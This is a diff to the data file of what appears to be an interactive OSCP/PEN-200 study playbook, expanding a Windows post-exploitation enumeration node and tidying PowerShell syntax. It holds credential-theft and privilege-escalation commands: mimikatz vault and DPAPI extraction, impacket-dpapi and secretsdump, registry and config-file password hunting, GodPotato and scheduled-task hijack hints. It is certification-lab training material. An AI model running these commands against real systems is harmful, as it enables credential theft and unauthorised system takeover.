@@ -815,7 +815,7 @@ ldapsearch -x -h $IP -D "user@domain.com" -w 'pass' \\
   -b "dc=domain,dc=com" "(objectClass=user)" description
 
 Get-DomainUser | select samaccountname,description \\
-  | where {$_.description -ne $null}
+  | Where description -ne $null
 
 Find-DomainShare -CheckShareAccess`,
     warn: null,
@@ -1647,11 +1647,11 @@ mimikatz "vault::cred /patch" exit
 mimikatz "dpapi::cred /in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\<blob>" exit
 
 # Find all DPAPI blobs
-dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul
-dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\* 2>nul
+dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>$null
+dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\* 2>$null
 
 # Master keys needed to decrypt
-dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\* 2>nul
+dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\* 2>$null
 
 # From Kali with domain backup key (DA required)
 impacket-dpapi backupkeys --export -t domain/admin:'pass'@$IP`,
@@ -5099,26 +5099,102 @@ cat /root/proof.txt
   // ==========================================
   windows_post_exploit: {
     phase: "WINDOWS",
-    title: "Windows — Initial Foothold",
-    body: "Orient immediately. Who are you, what privileges do you have, what's the network look like. Token privileges are your first PrivEsc signal.",
-    cmd: `whoami
+    title: "Windows — Initial Foothold Enumeration",
+    body: "Orient before you attack. PEN-200 Module 17: gather situational awareness first. The privesc vector is almost always hidden in this output.",
+    cmd: `# ── STEP 1: WHO AM I ─────────────────────────────────
+whoami
 whoami /all
 whoami /priv
+whoami /groups
 hostname
-systeminfo
-ipconfig /all
 
-# Grab flag
-type C:\\Users\\%username%\\Desktop\\local.txt
-Get-ChildItem -Path "C:\\Users\\*" -Include "local.txt" -Recurse -EA SilentlyContinue | Get-Content`,
-    warn: null,
+# ── STEP 2: INTEGRITY LEVEL AND UAC ──────────────────
+# Medium = UAC active, High = already elevated
+whoami /groups | findstr "Mandatory Label"
+
+# ── STEP 3: USERS AND GROUPS ──────────────────────────
+net user
+Get-LocalUser
+net localgroup
+Get-LocalGroup
+Get-LocalGroupMember Administrators
+Get-LocalGroupMember "Remote Desktop Users"
+Get-LocalGroupMember "Remote Management Users"
+Get-LocalGroupMember "Backup Operators"
+
+# ── STEP 4: OS AND ARCHITECTURE ───────────────────────
+systeminfo
+
+# ── STEP 5: NETWORK ───────────────────────────────────
+ipconfig /all
+route print
+netstat -ano
+arp -a
+
+# ── STEP 6: INSTALLED APPLICATIONS ───────────────────
+Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname
+Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname
+Get-ChildItem "C:\\Program Files", "C:\\Program Files (x86)" | select Name
+
+# ── STEP 7: RUNNING PROCESSES ─────────────────────────
+Get-Process
+
+# ── STEP 8: SCHEDULED TASKS ───────────────────────────
+schtasks /query /fo LIST /v
+Get-ScheduledTask | Where TaskPath -notlike "\\\\Microsoft*" | Select TaskName,TaskPath
+
+# ── STEP 9: SERVICES ──────────────────────────────────
+Get-CimInstance Win32_Service | Where State -eq "Running" | Select Name,PathName
+wmic service get name,pathname
+
+# ── STEP 10: SENSITIVE INFO ───────────────────────────
+type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
+Get-History
+cmdkey /list
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+
+# AlwaysInstallElevated — if both = 1, MSI runs as SYSTEM
+reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+
+# ── STEP 11: CREDENTIAL FILES ─────────────────────────
+Get-ChildItem -Path C:\\ -Include unattend.xml,sysprep.xml,sysprep.inf -Recurse -EA SilentlyContinue
+type C:\\Windows\\Panther\\Unattend.xml
+type C:\\Windows\\System32\\sysprep\\sysprep.xml
+type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\FileZilla\\sitemanager.xml
+type C:\\xampp\\mysql\\bin\\my.ini
+type C:\\xampp\\phpMyAdmin\\config.inc.php
+Get-ChildItem -Path C:\\inetpub -Include web.config -Recurse -EA SilentlyContinue | Get-Content
+Get-ChildItem Env: | Select Name,Value
+
+# ── STEP 12: GRAB FLAGS ───────────────────────────────
+type C:\\Users\\$env:USERNAME\\Desktop\\local.txt
+Get-ChildItem -Path C:\\Users -Include local.txt,proof.txt -Recurse -EA SilentlyContinue | Get-Content
+
+# ── HIGH VALUE TARGETS FROM MODULE 17 ────────────────
+# KeePass       -> keepass2john -> crack master password
+# FileZilla     -> sitemanager.xml for saved creds
+# XAMPP         -> MySQL config for creds
+# AdminTeam / BackupAdmin / daveadmin -> admin account variants
+# Unquoted service paths -> writable dir = hijack
+# Scheduled tasks -> writable script = SYSTEM execution
+# SeImpersonatePrivilege -> GodPotato = instant SYSTEM`,
+    warn: "Read whoami /priv before anything else — SeImpersonatePrivilege is instant SYSTEM via GodPotato. PowerShell history is the most underrated vector on OSCP. KeePass and FileZilla installs almost always contain credentials.",
     choices: [
-      { label: "New subnet in ipconfig/route print — pivot!", next: "pivot_start" },
-      { label: "Run WinPEAS (automated)", next: "winpeas" },
-      { label: "Check token privs first (whoami /priv)", next: "token_privs" },
-      { label: "PowerShell tools blocked — AMSI bypass first", next: "amsi_bypass" },
+      { label: "SeImpersonatePrivilege in whoami /priv", next: "token_privs" },
+      { label: "Second NIC in ipconfig — pivot opportunity", next: "pivot_start" },
+      { label: "Run WinPEAS automated enum", next: "winpeas" },
+      { label: "Found KeePass / password manager", next: "hashcrack" },
+      { label: "Found creds in history/registry/files", next: "creds_found" },
+      { label: "Check service-based privesc vectors", next: "unquoted_service" },
+      { label: "AlwaysInstallElevated both keys = 1", next: "always_install_elevated" },
+      { label: "PowerShell blocked — AMSI bypass first", next: "amsi_bypass" },
     ],
   },
+
+
 
   winpeas: {
     phase: "WINDOWS",
@@ -5276,10 +5352,10 @@ impacket-secretsdump -sam sam -system system LOCAL
   "exit"
 
 # Interesting file locations
-dir /s /b C:\\Users\\*.xml 2>nul
-dir /s /b C:\\Users\\*.txt 2>nul
-dir /s /b C:\\*pass* 2>nul
-dir /s /b C:\\*.config 2>nul`,
+dir /s /b C:\\Users\\*.xml 2>$null
+dir /s /b C:\\Users\\*.txt 2>$null
+dir /s /b C:\\*pass* 2>$null
+dir /s /b C:\\*.config 2>$null`,
     warn: null,
     choices: [
       { label: "Found NTLM hash — Pass the Hash", next: "pth" },
@@ -5331,11 +5407,11 @@ net localgroup administrators
 
 # -- SERVICES -----------------------------
 wmic service get name,displayname,startmode,pathname | findstr /v "C:\\Windows"
-Get-WmiObject win32_service | where {$_.PathName -notlike "*Windows*"} | select Name,PathName,StartMode
+Get-WmiObject win32_service | Where PathName -notlike "*Windows*" | select Name,PathName,StartMode
 
 # -- SCHEDULED TASKS ----------------------
 schtasks /query /fo LIST /v | findstr /i "task\|run\|next\|status\|as user"
-Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | Select TaskName,Actions
+Get-ScheduledTask | Where TaskPath -notlike "\\Microsoft*" | Select TaskName,Actions
 
 # -- INSTALLED SOFTWARE --------------------
 wmic product get name,version
@@ -5413,7 +5489,7 @@ echo C:\Windows\Temp\shell.exe >> C:\path\to\task.bat`,
 # Look for: SYSTEM process searching writable directories
 
 # Method 2: Check service directories for write access
-Get-WmiObject win32_service | where {$_.State -eq "Running"} | select Name,PathName
+Get-WmiObject win32_service | Where State -eq "Running" | select Name,PathName
 accesschk.exe /accepteula -wud "C:\Program Files\VulnApp\"
 
 # Method 3: PowerSploit
@@ -6166,7 +6242,7 @@ cat /var/www/html/.env 2>/dev/null
 cat /var/www/html/wp-config.php 2>/dev/null    # WordPress DB creds
 cat /etc/phpmyadmin/config-db.php 2>/dev/null
 cat /var/www/html/configuration.php 2>/dev/null # Joomla
-find /var/www -name "*.conf" -exec grep -i "pass" {} + 2>/dev/null
+find /var/www -name '*.conf' -exec grep -i 'pass' {} +
 
 # -- DATABASE CREDENTIAL FILES -------------
 find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
